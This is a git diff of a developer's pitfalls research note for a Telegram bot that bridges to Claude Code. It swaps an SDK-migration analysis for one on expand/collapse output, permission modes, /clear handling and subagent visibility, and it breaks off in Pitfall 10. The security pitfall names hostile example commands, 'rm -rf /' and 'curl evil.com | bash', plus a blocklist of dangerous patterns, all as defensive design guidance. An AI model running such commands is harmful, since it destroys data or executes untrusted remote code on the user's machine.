@@ -1,209 +1,177 @@
-# Domain Pitfalls: Claude Agent SDK Migration
+# Pitfalls Research: v3.0 UX Overhaul
 
-**Domain:** Migrating Telegram bot from hook-based architecture to Claude Agent SDK
+**Domain:** Adding compact tool output, permission modes, subagent visibility, and /clear topic reuse to an existing Telegram bot bridge for Claude Code
 **Researched:** 2026-03-01
-**Confidence:** HIGH (verified against official SDK docs, GitHub issues, and changelog)
+**Confidence:** HIGH (verified against Telegram Bot API docs, Claude Code hooks reference, existing codebase analysis)
 
 ## Critical Pitfalls
 
-Mistakes that cause rewrites, data loss, or architectural dead ends.
+Mistakes that cause rewrites, data loss, or require architectural changes to fix.
 
 ---
 
-### Pitfall 1: Each SDK Session Spawns a Separate OS Process (~12s Cold Start, ~50-100MB RAM)
+### Pitfall 1: Telegram Inline Keyboard callback_data 64-Byte Limit Overflow
 
 **What goes wrong:**
-The Claude Agent SDK does not run as a library in your Node.js process. Each `query()` call spawns a new Claude Code CLI child process. This process takes ~12 seconds to initialize (loading CLI, connecting to API, setting up tools). With 2-3 concurrent sessions, that is 2-3 child processes consuming 50-100MB RAM each, plus the ~12-second startup delay every time a new session begins. Your bot process (grammY + Fastify) is the parent of all these children.
+The expand/collapse feature needs callback_data to identify which tool call to expand. If callback_data encodes too much information (tool_use_id + action + session context), it exceeds Telegram's hard 64-byte limit and the API returns `400 BUTTON_DATA_INVALID`. The current approval keyboard uses `approve:{toolUseId}` where toolUseId is a UUID (36 chars) = 44 bytes total, which fits. But adding expand/collapse with additional context (e.g., `expand:{toolUseId}:{messageId}`) can easily exceed 64 bytes.
 
 **Why it happens:**
-The SDK is a wrapper around the Claude Code CLI, not a native library. It communicates with child processes via stdin/stdout JSON messages. There is no "daemon mode" or process pooling -- each session is a fresh process spawn. This is a fundamental architectural choice documented in GitHub issue #34 and confirmed by Anthropic's response recommending streaming input mode as the workaround for single-session latency.
+Developers encode all needed state into callback_data without measuring byte length. UUIDs are 36 characters. Action prefixes add 7-10 characters. Any additional context (message IDs, page numbers, session IDs) pushes past the limit. The 64-byte limit is enforced per button, not per keyboard.
 
-**Consequences:**
-- 12-second delay before a new Claude Code session can respond in Telegram
-- 2-3 concurrent sessions = 150-300MB additional RAM on top of the bot process
-- Orphaned child processes if the bot crashes (issue #142 -- NOT FIXED as of March 2026)
-- Node.js parent process must manage child process lifecycle (SIGTERM, SIGKILL)
-
-**Prevention:**
-- Use streaming input mode (AsyncIterable prompt) for long-lived sessions -- keeps the process alive between messages, reducing subsequent message latency to 2-3 seconds
-- Budget for the 12-second cold start in UX: show "Starting session..." in Telegram immediately, update when ready
-- Implement periodic orphan process cleanup: scan for Claude CLI processes whose parent PID no longer exists
-- Set `maxTurns` to prevent runaway sessions consuming memory indefinitely
-- Monitor RSS of child processes and implement a hard kill if any exceeds a threshold (e.g., 200MB)
+**How to avoid:**
+- Use a server-side lookup Map keyed by a short token (8-char random ID or incrementing counter) that maps to the full state. callback_data becomes `exp:a1b2c3d4` (12 bytes).
+- Alternatively, since tool_use_id is a UUID, use the first 8 characters of the UUID as the key (collision probability is negligible within a single session) and store the full ID in the lookup.
+- Clean up the lookup Map when sessions end to prevent memory leaks.
+- The current approval pattern (`approve:{uuid}` = 44 bytes) is safe, but permission mode buttons that need more context are not. Budget: 64 bytes minus 10-byte action prefix = 54 bytes for the identifier.
 
 **Warning signs:**
-- Increasing memory usage over time with active sessions
-- `ps aux | grep claude` showing more processes than expected active sessions
-- 12-second gaps between session start and first Telegram message
+- `400 Bad Request` errors when sending inline keyboards
+- Buttons that work for short tool IDs but fail for longer ones
+- Tests passing with mock data but failing with real UUIDs
 
 **Phase to address:**
-Phase 1 (SDK integration foundation). The process lifecycle management must be designed before any feature work. This is the single most impactful architectural difference from the v1.0 hook-based approach.
+Phase 1 (compact tool output with expand/collapse). Design the callback_data encoding scheme before implementing any inline keyboards for expand/collapse.
 
 ---
 
-### Pitfall 2: AsyncIterable Prompt Mode Doubles Token Costs (Issue #207 -- NOT FIXED)
+### Pitfall 2: Expand/Collapse Content Storage Memory Leak
 
 **What goes wrong:**
-When using streaming input mode (the recommended approach for multi-turn conversations), every user message triggers TWO complete AI turns instead of one. The SDK sends the user message, Claude responds (turn 1), then the CLI interprets the still-open stdin as "more input may come" and runs a redundant second turn (turn 2). This doubles your Anthropic API costs and doubles the messages you need to process for Telegram output.
+When a tool call is displayed in compact form with an "Expand" button, the full content (tool input, tool output, file contents) must be stored somewhere so it can be displayed when the user taps "Expand." If stored in an in-memory Map keyed by tool_use_id, the Map grows indefinitely. A session with 500 tool calls, each storing 2-10KB of content, consumes 1-5MB. Over 10 sessions without cleanup, that is 10-50MB of data that is never read again because users rarely expand old messages. Over days of continuous operation, this becomes a significant memory leak.
 
 **Why it happens:**
-The `streamInput()` function immediately loops back to await the next message from the AsyncIterable after writing a message. Because the stdin stays open (it is a persistent stream), the CLI runs another agentic turn before the next user message arrives. String prompts close stdin after the first result, which is why single-shot mode does not have this problem.
+The natural implementation is `expandableContent.set(toolUseId, fullContent)` in the tool call handler, with cleanup "deferred to later." But Telegram messages persist forever, so users can theoretically tap "Expand" on a message from hours ago. Developers keep the content "just in case" instead of accepting a time/count-based eviction.
 
-**Consequences:**
-- 2x token consumption per user interaction
-- 2x the streaming output to process and forward to Telegram
-- Duplicate `result` messages that must be filtered
-- With 7+ agents handling ~1000 messages/month: $140-$700/month in wasted tokens (per reporter's estimate)
-
-**Prevention:**
-- **Workaround A (recommended for our use case):** Use one-shot `query()` with `resume: sessionId` for each user message. This avoids the double-turn bug entirely. Downside: 3-12 second cold start per message (the 12-second overhead from Pitfall 1 applies).
-- **Workaround B:** Use streaming input but filter output to only process the FIRST `result` message per user turn. Tokens are still wasted but UX is correct.
-- **Workaround C:** Set `maxTurns: 1` per query. This prevents the second turn but also prevents Claude from using tools and then responding (Claude needs at least 2 turns for tool-use workflows). UNSUITABLE for our use case.
-- Track this issue (#207) and switch to streaming input once fixed.
+**How to avoid:**
+- Use an LRU cache with a maximum size (e.g., 200 entries per session) for expandable content. When the cache exceeds the limit, evict oldest entries.
+- When a user taps "Expand" on an evicted entry, show a graceful fallback: "Content no longer available. Recent tool calls only."
+- Set a TTL on entries (e.g., 30 minutes). After TTL, remove the content but leave the message with the "Expand" button disabled or replaced with "(expired)".
+- On session end, clean up ALL stored content for that session.
+- Track the Map size in the periodic summary/status to detect unexpected growth.
 
 **Warning signs:**
-- Telegram topics showing duplicate Claude responses per user message
-- API cost bills doubling compared to v1.0 hook-based approach
-- Two `result` messages per query in SDK output logs
+- `process.memoryUsage().heapUsed` growing linearly over time
+- Session cleanup not reducing memory to baseline
+- More entries in the content Map than recent tool calls
 
 **Phase to address:**
-Phase 1 (SDK session management). The session interaction pattern (one-shot+resume vs streaming) must be decided early and consistently applied.
+Phase 1 (compact tool output). The storage strategy must be designed as part of the expand/collapse feature, not added later.
 
 ---
 
-### Pitfall 3: V2 Preview API Silently Ignores Critical Options (Issue #176 -- NOT FIXED)
+### Pitfall 3: Message Editing Race Conditions for Expand/Collapse
 
 **What goes wrong:**
-The new V2 interface (`unstable_v2_createSession`) silently ignores `permissionMode`, `cwd`, `allowedTools`, `disallowedTools`, `mcpServers`, and `settingSources`. These are hardcoded in the internal `SessionImpl` constructor. Your bot creates a session with `permissionMode: 'default'` and `canUseTool` callback, but the session actually runs with hardcoded defaults, bypassing your permission logic entirely.
+When a user taps "Expand," the bot calls `editMessageText` to replace the compact view with the full view and update the button to "Collapse." But if the MessageBatcher is currently editing the same message (e.g., appending a new tool call to a batched message), two concurrent `editMessageText` calls race. One wins, the other gets `400 message is not modified` (if content matches) or silently overwrites the other edit. The user sees a corrupt message: expanded content mixed with new tool calls, or the expand/collapse silently undone.
 
 **Why it happens:**
-The V2 API is an **unstable preview** (all exports prefixed with `unstable_v2_`). The `ProcessTransport` initialization hardcodes values instead of reading from the options object. This is explicitly documented as a preview limitation.
+The existing architecture batches tool call messages (MessageBatcher combines multiple tool calls into one Telegram message). The expand/collapse feature edits individual messages via callback queries. These two editing paths are independent and can fire simultaneously. Telegram processes edits sequentially per message, but the bot does not know the current server-side state of the message after a batch edit.
 
-**Consequences:**
-- `canUseTool` callback never fires (or fires with wrong context)
-- Sessions run in wrong directory, reading wrong project files
-- No tool restrictions applied -- Claude can use any tool
-- Silent failure: no error thrown, just wrong behavior
-- Session forking is not available in V2 at all
-
-**Prevention:**
-- **Do NOT use the V2 preview API for production.** Use the V1 `query()` API exclusively.
-- If you prototype with V2, verify every option takes effect by checking the `system` init message (`message.type === "system" && message.subtype === "init"`)
-- The V2 API is appealing because `send()`/`stream()` is simpler than AsyncIterable generators. But the V1 API is the only one that actually works correctly for our use case.
-- Track issues #176, #154, #160, #171 for when options passthrough is fixed.
+**How to avoid:**
+- Expand/collapse should operate on INDIVIDUAL messages, not batched messages. Each tool call that has expandable content gets its own Telegram message with its own inline keyboard.
+- If batching is needed for rate limit reasons, batch only compact one-liners without expand buttons. Only standalone messages (with their own message_id) get expand/collapse buttons.
+- Implement a per-message edit lock: before editing, acquire the lock for that message_id. If the lock is held, queue the edit. This prevents concurrent edits to the same message.
+- Always catch `message is not modified` errors (already done in TopicManager.editMessage) but also catch the `message_id not found` case for messages that were deleted.
+- Track the "current state" (expanded vs collapsed) per message_id in memory, and compare before editing to avoid redundant edits.
 
 **Warning signs:**
-- Session init message showing unexpected `permissionMode`, `cwd`, or `tools`
-- `canUseTool` callback never being invoked
-- Sessions accessing files outside the expected project directory
+- "message is not modified" errors appearing in logs after callback queries
+- Users tapping "Expand" and seeing no change, or seeing the compact view re-appear after expand
+- Expand working on non-batched messages but failing on batched ones
 
 **Phase to address:**
-Phase 1 (technology decision). Decide V1 vs V2 on day one. Use V1.
+Phase 1 (compact tool output). The decision about what gets batched vs standalone must be made during architecture. Messages with inline keyboards must be standalone.
 
 ---
 
-### Pitfall 4: canUseTool Callback Blocks the Entire Agent Loop
+### Pitfall 4: Auto-Accept Permission Mode Security Escalation
 
 **What goes wrong:**
-The `canUseTool` callback is invoked every time Claude wants to use a tool that requires permission. Your bot must send a Telegram message with Approve/Deny buttons, then WAIT for the user to respond. During this wait, the entire Claude agent loop is blocked -- no other tools execute, no text streams, no progress happens. If you have a 5-minute approval timeout, Claude sits idle for 5 minutes per tool call.
+"Accept All" mode auto-approves every tool call, including `Bash "rm -rf /"`, `Bash "curl evil.com | bash"`, or write operations to sensitive files like `~/.ssh/authorized_keys`. If a Claude session is compromised, prompt-injected, or simply makes a mistake, "Accept All" mode provides zero defense. Unlike Claude Code's native `--dangerously-skip-permissions` (which is a conscious CLI flag), a Telegram button tap to set "Accept All" can be accidental or poorly understood by the user.
 
 **Why it happens:**
-This is by design. The `canUseTool` callback returns a Promise that the SDK awaits before proceeding. Unlike the v1.0 HTTP hook approach where the HTTP response was the blocking mechanism, the SDK callback blocks the internal agent loop directly. The async nature means the Node.js event loop is NOT blocked (grammY still processes updates), but the specific Claude session is paused.
+Developers implement permission modes as a simple enum that gates the approval flow. "Accept All" bypasses the entire `onPreToolUse` callback. The logic is clean and simple. But the security implications are severe because the bot operates remotely -- the user cannot see the terminal output or intervene quickly. A destructive command executes and the damage is done before the Telegram message about it arrives.
 
-**Consequences:**
-- User sees "Using Bash..." in Telegram, waits for approval, but no other session activity happens during the wait
-- If approval timeout is long, Claude may hit API timeouts or internal session timeouts
-- Multiple pending approvals in the same session are impossible -- they are sequential
-- The `signal: AbortSignal` in the callback options can fire if the query is interrupted, but this is easy to miss
-
-**Prevention:**
-- Keep approval timeouts short (60-120 seconds, not 5+ minutes)
-- Use `permissionMode: 'acceptEdits'` for low-risk operations so only dangerous tools (Bash with destructive commands) need approval
-- Implement a "fast-track" in `canUseTool`: auto-approve Read, Glob, Grep without sending to Telegram
-- Show a "Waiting for approval..." status in the Telegram topic so the user knows Claude is blocked
-- Handle the AbortSignal: if it fires while waiting for Telegram approval, resolve with deny immediately
-- Consider using the `PermissionRequest` hook (fires before `canUseTool`) to send notifications while still allowing programmatic decisions
+**How to avoid:**
+- **Do NOT implement a true "Accept All" mode.** Instead, implement tiered auto-accept:
+  - **Safe Only:** Auto-approve Read, Glob, Grep, WebSearch, WebFetch. All others require manual approval.
+  - **Accept Edits:** Auto-approve Safe tools plus Write, Edit, MultiEdit. Bash still requires approval.
+  - **Same Tool:** After manually approving one Bash command, auto-approve the same tool (not the same command) for the session. Still prompts for the first use.
+  - **Until Done:** Auto-approve everything for this agentic turn only. Resets after the agent stops.
+- Even in "Until Done" mode, maintain a blocklist of patterns that ALWAYS require approval: `rm -rf`, `sudo`, `chmod 777`, `curl | bash`, SSH key operations, git force push.
+- Show a persistent warning in the status message when any auto-accept mode is active.
+- Require confirmation for enabling "Until Done" mode -- the button should trigger a follow-up "Are you sure?" prompt.
+- Log all auto-approved operations to a separate audit log for post-incident review.
 
 **Warning signs:**
-- Claude sessions appearing "stuck" for long periods
-- Telegram approval buttons that expire frequently because Claude's internal timeout fires before the user responds
-- High latency between tool calls in sessions with approval enabled
+- Tests passing "Accept All" without testing dangerous command patterns
+- No blocklist or safety net in auto-accept logic
+- Status message not showing current permission mode
+- No audit trail for auto-approved operations
 
 **Phase to address:**
-Phase 2 (approval integration). The approval UX must be redesigned for the SDK's blocking callback model, which is fundamentally different from v1.0's HTTP request/response model.
+Phase 2 (permission modes). The security design must be part of the permission mode architecture. Never merge an "Accept All" without the blocklist guard.
 
 ---
 
-### Pitfall 5: Bot Crash Orphans Claude CLI Child Processes (Issue #142 -- NOT FIXED)
+### Pitfall 5: /clear Triggers Both SessionEnd and SessionStart -- Double Processing
 
 **What goes wrong:**
-If the bot process (Node.js parent) crashes or is killed with SIGKILL, all spawned Claude CLI child processes become orphans. These orphaned processes continue running indefinitely, each consuming 50-100MB RAM. Over 24 hours of normal usage with occasional crashes, 47 orphaned processes were observed consuming ~3GB RAM (per issue #142 reporter).
+When the user runs `/clear` in Claude Code, two hook events fire in sequence: `SessionEnd` (reason: "clear") and `SessionStart` (source: "clear"). If the bot handles `SessionEnd` by closing the topic and posting a summary (the current behavior in `handleSessionEnd`), the topic gets closed. Then `SessionStart` fires and the bot tries to reuse the topic -- but it is already closed. The bot either fails to post to the closed topic, or creates a new topic (defeating the purpose of topic reuse), or crashes trying to reopen a topic it just closed.
 
 **Why it happens:**
-The SDK relies on the parent process being alive to send abort signals to children. There is no `PR_SET_PDEATHSIG` (Linux) or equivalent mechanism to auto-terminate children when the parent dies. The child processes have no heartbeat to the parent. When the parent vanishes, children just keep running.
+The existing `handleSessionEnd` code does NOT check the reason for session end. It unconditionally marks the session as "closed" and closes the Telegram topic. The `/clear` use case was not anticipated in the v1.0/v2.0 architecture, where session end always meant "done." The handler runs `sessionStore.updateStatus(sessionId, 'closed')` and then `topicManager.closeTopic(threadId, topicName)`.
 
-**Consequences:**
-- Memory leak proportional to crash frequency times active sessions
-- Orphaned processes may hold file locks or API connections
-- Multiple bot restarts compound the problem (each restart leaves a generation of orphans)
-- Eventually triggers OOM on the host machine
+The critical detail: when `/clear` fires, the `SessionEnd` has `reason: "clear"`, and the subsequent `SessionStart` has `source: "clear"` and the SAME `session_id` and `cwd`. But the session ID might change -- Claude Code documentation does not guarantee session ID stability across `/clear`.
 
-**Prevention:**
-- On bot startup, scan for orphaned Claude CLI processes and kill them:
-  ```bash
-  # Kill Claude CLI processes whose parent is init (PID 1 = orphaned)
-  pgrep -P 1 -f "claude" | xargs kill -9
-  ```
-- Implement a watchdog that periodically checks for processes spawned by this bot's PID tree
-- Use systemd or a process manager that kills the entire cgroup on restart (ensures children die with parent)
-- On Linux, set `PR_SET_PDEATHSIG` on child processes via the `spawnClaudeCodeProcess` option:
-  ```typescript
-  options: {
-    spawnClaudeCodeProcess: (spawnOpts) => {
-      // Custom spawn that sets death signal
-    }
-  }
-  ```
-- Store PIDs of all spawned SDK processes in a file; on startup, kill any still-running PIDs from the file
+**How to avoid:**
+- Check `reason` in `handleSessionEnd`. If `reason === "clear"`, do NOT close the topic. Instead:
+  1. Post a visual separator message ("--- Session cleared ---")
+  2. Keep the session status as "active" (or a new "cleared" intermediate state)
+  3. Reset session counters (toolCallCount, filesChanged, contextPercent) but keep the same threadId
+  4. Wait for the subsequent `SessionStart` (source: "clear") to confirm the session restarted
+- Handle the `SessionStart` (source: "clear") case in `handleSessionStart`:
+  1. Match by `cwd` (same as resume detection), not by session ID
+  2. Reuse the existing topic (same threadId)
+  3. Unpin the old status message, create and pin a new one
+  4. Post a "Session cleared" notification
+- **Important timing edge case:** The `SessionEnd` and `SessionStart` hooks fire in sequence but the HTTP responses are separate requests. The bot must handle the possibility that `SessionStart` arrives before `SessionEnd` processing completes (especially if `SessionEnd` is waiting for a Telegram API call). Use a per-session state machine: `active` -> `clearing` -> `active` (not `active` -> `closed` -> `active`).
 
 **Warning signs:**
-- `ps aux | grep claude` showing processes with PPID=1 (orphans)
-- Gradually increasing memory usage even when no sessions are active
-- Host machine running out of memory after extended bot operation
+- Topic being closed and immediately reopened after `/clear`
+- New topic being created after `/clear` instead of reusing existing one
+- "Failed to send message" errors in a closed topic right after `/clear`
+- Session state flickering between "active" and "closed"
 
 **Phase to address:**
-Phase 1 (process lifecycle). Orphan cleanup must be implemented from day one, before multi-session support.
+Phase 3 (/clear topic reuse). This requires changes to both `handleSessionEnd` and `handleSessionStart` simultaneously. Cannot be done incrementally.
 
 ---
 
-### Pitfall 6: grammY Event Loop and SDK Async Generator Interference
+### Pitfall 6: Subagent Visibility Without SubagentStart/SubagentStop Hooks
 
 **What goes wrong:**
-grammY runs on the Node.js event loop processing Telegram updates via long polling. The SDK's streaming output is consumed via `for await...of` on an AsyncGenerator. If the streaming loop does not yield control frequently, grammY's update processing stalls -- approval button presses are not received, text input from Telegram is delayed, and the bot appears unresponsive.
+The bot is currently wired to receive only `SessionStart`, `SessionEnd`, `PostToolUse`, `PreToolUse`, and `Notification` hooks. The `SubagentStart` and `SubagentStop` hook events are NOT configured in `~/.claude/settings.json` by the `installHooks()` function. Without these hooks, the bot has zero visibility into subagent activity. Tool calls from subagents DO arrive via `PostToolUse` (they fire for all tool calls including subagent ones), but they arrive with `isSidechain: true` in the transcript -- which the bot currently filters OUT (line 117 of handlers.ts: `if (entry.isSidechain) continue`).
 
 **Why it happens:**
-Both grammY and the SDK compete for the same Node.js event loop. The `for await` loop over SDK messages is async but may process many messages in a tight loop (especially during tool streaming with `includePartialMessages: true`). If the loop body does synchronous work (formatting, string manipulation) without yielding, grammY's middleware cannot run until the current microtask completes.
+Subagent hooks (`SubagentStart`, `SubagentStop`) were added to Claude Code after the bot was originally built. The `installHooks()` utility only registers the five hook events from v1.0. The transcript backfill code explicitly skips sidechain entries. This creates a blind spot: subagent activity is invisible.
 
-**Consequences:**
-- User taps "Approve" but the bot does not process the callback query for seconds
-- Telegram shows the spinning loader on buttons for 10+ seconds
-- Multiple sessions interfere with each other -- one session's streaming output delays another session's approval processing
-- Under heavy streaming, the bot may fail to answer callback queries within Telegram's timeout, causing permanent spinners
-
-**Prevention:**
-- Process SDK messages asynchronously: do NOT do heavy synchronous work in the `for await` loop body. Enqueue messages to a buffer and process them in a separate async task.
-- Use `setImmediate()` or `setTimeout(fn, 0)` periodically in the streaming loop to yield to the event loop
-- Consider running each SDK session's message consumer in a separate "micro-task chain" that explicitly yields between messages
-- Keep grammY's callback query handler (`bot.callbackQuery(...)`) as lightweight as possible -- just resolve the deferred promise, do not await Telegram API calls
-- Monitor event loop lag (e.g., `perf_hooks.monitorEventLoopDelay()`) and log warnings if lag exceeds 100ms
+**How to avoid:**
+- Add `SubagentStart` and `SubagentStop` HTTP hooks to the `installHooks()` configuration.
+- Add handler methods for SubagentStart and SubagentStop in HookHandlers.
+- For `SubagentStart`: post a compact notification to the topic: "`Agent: Explore started`" with the agent_type.
+- For `SubagentStop`: post the last_assistant_message (summary of what the subagent found/did).
+- For `PostToolUse` events from subagents: the payload itself does NOT contain `isSidechain` -- that field is only in the JSONL transcript. The HTTP hook payload does not distinguish main-chain from sidechain tool calls. You need to correlate: if a `SubagentStart` was received and the agent has not yet stopped, subsequent tool calls with the same session context may be from the subagent. BUT: the hook payload does not contain `agent_id`.
+- **Key insight:** PostToolUse hooks fire for ALL tool calls regardless of which agent (main or sub) made them. There is no field in the PostToolUse payload to distinguish. The ONLY way to correlate tool calls to subagents is via the transcript (isSidechain + agentId fields in the JSONL). This means subagent visibility must use the SubagentStart/SubagentStop hooks for lifecycle events, and the PostToolUse events remain "ambient" -- they show all tool activity without attribution.
+- Accept the limitation: full per-subagent tool call attribution is not possible via hooks alone. Display subagent lifecycle (start/stop) and let tool calls appear in the main stream.
 
 **Warning signs:**
-- Callback queries timing out (Telegram shows spinning button)
-- Approval responses taking 5+ seconds to register
-- One session's activity visibly delaying another session's Telegram messages
+- "Full subagent visibility" feature appearing complete but actually showing zero subagent information
+- Tool calls from subagents being silently dropped because of isSidechain filtering
+- SubagentStart/SubagentStop never firing because hooks are not registered
 
 **Phase to address:**
-Phase 1 (architecture). The SDK message consumption pattern must be designed to coexist with grammY from the start. Retrofitting event loop management is extremely difficult.
+Phase 4 (subagent visibility). Must update installHooks, add SubagentStart/SubagentStop types, and add handlers before any subagent display work.
 
 ---
 
@@ -213,103 +181,133 @@ Mistakes that cause significant rework or degraded UX but are recoverable.
 
 ---
 
-### Pitfall 7: Streaming Output Volume Overwhelms Telegram Rate Limits
+### Pitfall 7: Pinning/Unpinning Race Conditions During /clear
 
 **What goes wrong:**
-With `includePartialMessages: true`, the SDK emits dozens of `stream_event` messages per second (one per text chunk, one per tool input chunk). If you naively forward each chunk to Telegram via `editMessageText`, you hit Telegram's ~5 edits/minute/message limit and the ~20 messages/minute/group limit within seconds. All bot API calls fail with 429 for 30-60 seconds, blocking approval messages for ALL sessions.
+The /clear topic reuse feature requires: (1) unpin the old status message, (2) create a new status message, (3) pin the new status message. If the unpin call is slow or fails, and the pin call for the new message succeeds, the topic shows two pinned messages. If the old unpin fails silently (the current TopicManager.pinMessage catches errors), the user sees stale status information pinned alongside the new status.
+
+Additionally, Telegram only allows one pinned message per topic (the last pinned one is shown prominently). If pin calls arrive out of order due to rate limiting or network latency, the wrong message ends up pinned.
 
 **Why it happens:**
-The SDK streams at API token speed. Telegram rate limits are designed for human-speed interaction. The mismatch is 100x or more. The v1.0 architecture had a natural throttle because hooks only fired on tool completion (not mid-stream). The SDK gives you everything, and you must filter aggressively.
+The bot's `pinMessage` method is fire-and-forget with error swallowing (line 148-157 of topics.ts). There is no `unpinChatMessage` method at all in the current TopicManager. The `/clear` feature requires both operations in a specific order, and the current infrastructure does not support ordered pin management.
 
-**Prevention:**
-- Do NOT use `includePartialMessages` for Telegram output. Use the default mode where you receive complete `SDKAssistantMessage` objects after each turn.
-- If you want progress indicators, track `content_block_start` events (tool starts) and `content_block_stop` events (tool ends) only -- these are low-frequency.
-- Reuse the v1.0 MessageBatcher pattern: accumulate messages for 2-3 seconds, then send one combined update.
-- Separate approval messages from informational messages -- approval messages bypass the queue and send immediately.
-- Consider a dedicated "status message" per session that gets edited at most once every 10 seconds with a summary of current activity.
+**How to avoid:**
+- Add an `unpinMessage(messageId)` method to TopicManager that calls `bot.api.unpinChatMessage(chatId, { message_id: messageId })`.
+- Add an `unpinAllTopicMessages(threadId)` method using `bot.api.unpinAllForumTopicMessages(chatId, threadId)` -- this is simpler and avoids the "which message to unpin" question.
+- Execute unpin-then-pin as a sequential pair, NOT concurrent.
+- If unpin fails, proceed with the pin anyway (the new pin will replace the old one as the prominently displayed pinned message in Telegram).
+- Store the statusMessageId in SessionInfo (already exists) and update it atomically when creating the new status message.
+
+**Warning signs:**
+- Two pinned messages visible in a topic after /clear
+- Status message showing stale context percentage after /clear
+- "Failed to unpin message" errors in logs
 
 **Phase to address:**
-Phase 2 (Telegram output forwarding). The v1.0 batching infrastructure should be preserved and adapted.
+Phase 3 (/clear topic reuse). Pin management must be implemented before /clear.
 
 ---
 
-### Pitfall 8: Session Resume After Bot Restart Requires Stored Session IDs
+### Pitfall 8: Permission Mode State Lost Across Bot Restart
 
 **What goes wrong:**
-In v1.0, the bot auto-discovered sessions via hook events. With the SDK, the bot CREATES sessions via `query()`. If the bot restarts, it has no SDK session handles -- it must `resume` each active session using the stored `sessionId`. If the session ID was not persisted (only held in memory), the bot cannot reconnect to any active Claude Code sessions. The sessions keep running as orphaned child processes (Pitfall 5) while the bot creates new, disconnected sessions.
+The user sets permission mode to "Accept Edits" via a Telegram button. The mode is stored only in memory (in the SessionInfo or a separate state object). The bot restarts. On reconnect, the permission mode resets to the default, but the user does not realize it. Claude's next tool call that would have been auto-approved now prompts for approval, confusing the user. Or worse: the user set "Safe Only" mode for a risky session, the bot restarts, and the mode resets to a more permissive default.
 
 **Why it happens:**
-SDK sessions are stateful processes. The session ID is returned in the `system` init message and must be captured and stored. The v1.0 hook architecture was stateless -- hooks fired for any active session, and the bot just had to be listening. The SDK requires explicit session ownership.
+The current `permissionMode` field in SessionInfo stores the Claude Code CLI's permission mode (from the hook payload), not the bot's per-session permission override. These are two different things: the CLI's permission mode determines which tools need approval from the perspective of Claude Code, while the bot's permission mode determines how the bot handles the approval callback. The bot override (Accept Edits, Same Tool, etc.) is a separate concept that needs its own persistence.
 
-**Prevention:**
-- Capture `session_id` from the first `SDKSystemMessage` (type: "system", subtype: "init") and persist it to the SessionStore immediately
-- On bot restart, iterate all active sessions from the store and call `query({ prompt: "continue", options: { resume: sessionId } })` for each
-- Consider `persistSession: true` (the default) so the SDK saves session state to disk, enabling resume even after process crashes
-- The `listSessions({ dir: cwd })` function can discover sessions that were persisted -- use it as a fallback if the session store is corrupted
+**How to avoid:**
+- Add a `botPermissionMode` field to SessionInfo (distinct from `permissionMode` which comes from the CLI).
+- Persist it via SessionStore (already serializes to JSON on every change).
+- On bot restart, restore the `botPermissionMode` from the persisted session and resume auto-accept behavior.
+- Consider adding a visual indicator in the reconnect message: "Bot reconnected. Permission mode: Accept Edits."
+- Default `botPermissionMode` to "prompt" (manual approval) -- the safest option.
+
+**Warning signs:**
+- Permission mode working in a session but resetting after bot restart
+- User not knowing their permission mode changed after restart
+- Tests not covering bot restart + permission mode persistence
 
 **Phase to address:**
-Phase 1 (session management). Session persistence must be designed before multi-session support.
+Phase 2 (permission modes). Persistence must be part of the initial implementation, not a follow-up.
 
 ---
 
-### Pitfall 9: canUseTool and Hooks Have Different Execution Order
+### Pitfall 9: editMessageText Rate Limiting During Expand/Collapse Spam
 
 **What goes wrong:**
-You implement approval logic in both `canUseTool` callback AND `PreToolUse` hooks, expecting them to work together. In reality, hooks execute BEFORE `canUseTool`. If a `PreToolUse` hook returns `{ decision: "approve" }`, the `canUseTool` callback is never called. If the hook returns `{ continue: true }` (pass-through), then `canUseTool` fires. If you put logging in hooks and approval in `canUseTool`, your logs say "approved" (from the hook) but the user was never asked.
+A user rapidly taps "Expand" and "Collapse" on multiple tool calls. Each tap triggers an `editMessageText` call. Telegram enforces approximately 5 edits per message per minute and ~30 messages per minute per group. After 5 rapid expand/collapse toggles on the same message, all subsequent edits fail with 429. The auto-retry plugin retries after the cooldown period, but the user sees a spinning loading indicator on the button for 30+ seconds. During this time, ALL other bot API calls for this chat (including approval messages and tool call posts) are also rate-limited.
 
 **Why it happens:**
-The SDK has two permission layers: hooks (inherited from CLI architecture) and `canUseTool` (SDK-specific callback). The hook system short-circuits if it returns a decision. The `canUseTool` is the fallback. This is documented but easy to misconfigure.
+The auto-retry and transformer-throttler plugins handle 429s at the API level, but they do not prevent the user from triggering rapid edits. The expand/collapse toggle is a UI control that invites rapid interaction. Unlike approval buttons (which are one-shot and get removed after use), expand/collapse buttons persist and can be tapped repeatedly.
 
-**Prevention:**
-- Use `canUseTool` for ALL interactive approval logic (sending to Telegram, waiting for user response)
-- Use hooks ONLY for logging, metrics, and non-blocking side effects (PostToolUse, Notification, etc.)
-- Do NOT return `{ decision: "approve" }` from PreToolUse hooks unless you intentionally want to bypass user approval
-- In Python, `canUseTool` requires a dummy PreToolUse hook that returns `{ continue: true }` to keep the stream open (documented quirk). In TypeScript, this is not required.
-- Test by checking: does the `canUseTool` callback fire for every tool call that should require approval?
+**How to avoid:**
+- Debounce expand/collapse callbacks: after processing one callback, ignore subsequent callbacks for the same message_id for 2 seconds. Answer the callback query immediately with a "Please wait..." text, but do not call editMessageText.
+- Track the last edit timestamp per message_id. If less than 1 second has passed, skip the edit and answer the callback with a toast notification.
+- Consider using `answerCallbackQuery` with `show_alert: false` as an immediate response, and the actual message edit on a 500ms debounce. This gives the user instant feedback (loading spinner clears) while rate-limiting the edit calls.
+- The existing auto-retry plugin handles 429s, but prevention is better than recovery. Budget 3 edits per message per minute and queue any excess.
+
+**Warning signs:**
+- 429 errors appearing in logs during expand/collapse usage
+- Approval messages delayed by rate limit cooldown periods
+- Loading spinners on buttons lasting 10+ seconds
+- Tool call posts delayed or batched more aggressively than expected
 
 **Phase to address:**
-Phase 2 (approval flow). Decide hook vs canUseTool responsibilities before implementing approval.
+Phase 1 (compact tool output). The callback query handler must include debouncing from the start.
 
 ---
 
-### Pitfall 10: SDK Settings Isolation Breaks Existing Claude Code Configuration
+### Pitfall 10: Subagent Transcript Path Access Failures
 
 **What goes wrong:**
-By default, the SDK does NOT load filesystem settings (`CLAUDE.md`, `.claude/settings.json`, user settings). This means your existing v1.0 hooks configuration, allowed tools, and project instructions are silently ignored. Claude Code sessions started by the SDK behave differently from sessions started via the CLI in the same project.
